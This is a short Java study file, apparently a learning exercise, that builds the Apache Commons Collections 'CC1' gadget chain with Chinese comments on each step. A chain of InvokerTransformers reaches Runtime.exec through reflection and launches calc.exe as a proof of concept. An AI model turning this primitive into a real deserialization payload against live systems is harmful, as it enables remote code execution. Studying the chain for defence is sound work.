package day1.cc;


import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CC1 {
    public static void main(String[] args) throws Exception{
        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

       // transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform(1);

    }
}
